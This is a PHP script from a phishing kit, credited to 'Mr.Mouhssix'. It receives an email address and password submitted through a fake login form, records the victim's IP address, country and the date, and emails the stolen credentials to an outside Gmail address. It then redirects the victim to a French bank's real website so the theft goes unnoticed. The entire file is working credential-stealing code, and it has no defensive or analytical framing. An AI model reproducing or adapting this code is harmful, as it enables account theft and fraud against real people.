<?php
session_start();
$F0L0xX_country  = $_POST['defaultcountry'];
if (getenv(HTTP_X_FORWARDED_FOR)){
$ip = getenv(HTTP_X_FORWARDED_FOR); } else {
$ip = getenv(REMOTE_ADDR); }
$date = date("d M, Y");
$time = date("g:i a"); 
$date = trim("Date : ".$date.", Time : ".$time);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "========================================================)===\n";
$message .= "------------------+ Pop Information +-----------------------\n";
$message .= "============================================================\n";
$message .= "Email	           :      ".$_POST['email']."\n";
$message .= "P-assword          :	  ".$_POST['paswword']."\n";
$message .= "============================================================\n";
$message .= "------------------+ Created By Mr.Mouhssix +----------------\n";
$message .= "============================================================\n";

$send="rajla8080@gmail.com";
$subject = "Mr | $F0L0xX_country | $ip | $date";
$headers = "From: EMAIL <infos@mox.fr>";

mail($send,$subject,$message,$headers);

header("Location:  http://www.boursorama.com/");

?>